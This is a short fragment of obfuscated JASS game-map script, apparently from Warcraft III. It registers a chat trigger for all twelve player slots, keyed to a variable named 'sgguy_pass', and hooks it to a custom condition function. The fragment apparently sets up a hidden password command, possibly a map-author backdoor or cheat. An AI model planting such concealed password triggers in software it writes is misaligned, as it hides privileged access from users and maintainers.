call TriggerRegisterPlayerChatEvent(u7g_tmTp7[80],Player(0),sgguy_pass,true)
call TriggerRegisterPlayerChatEvent(u7g_tmTp7[80],Player(1),sgguy_pass,true)
call TriggerRegisterPlayerChatEvent(u7g_tmTp7[80],Player(2),sgguy_pass,true)
call TriggerRegisterPlayerChatEvent(u7g_tmTp7[80],Player(3),sgguy_pass,true)
call TriggerRegisterPlayerChatEvent(u7g_tmTp7[80],Player(4),sgguy_pass,true)
call TriggerRegisterPlayerChatEvent(u7g_tmTp7[80],Player(5),sgguy_pass,true)
call TriggerRegisterPlayerChatEvent(u7g_tmTp7[80],Player(6),sgguy_pass,true)
call TriggerRegisterPlayerChatEvent(u7g_tmTp7[80],Player(7),sgguy_pass,true)
call TriggerRegisterPlayerChatEvent(u7g_tmTp7[80],Player(8),sgguy_pass,true)
call TriggerRegisterPlayerChatEvent(u7g_tmTp7[80],Player(9),sgguy_pass,true)
call TriggerRegisterPlayerChatEvent(u7g_tmTp7[80],Player(10),sgguy_pass,true)
call TriggerRegisterPlayerChatEvent(u7g_tmTp7[80],Player(11),sgguy_pass,true)
call TriggerAddCondition(u7g_tmTp7[80],Condition(function on8CustomTriggers7))
endfunction

// function main
call on8Sg_AMH7()
